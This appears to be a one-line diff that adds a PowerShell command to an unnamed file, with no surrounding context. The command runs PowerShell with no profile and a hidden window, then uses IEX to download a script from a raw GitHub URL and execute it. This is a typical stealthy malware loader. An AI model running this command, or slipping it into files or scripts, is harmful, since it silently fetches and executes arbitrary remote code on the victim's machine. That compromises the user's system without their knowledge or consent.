@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/zoepro064/x/refs/heads/main/x'))"
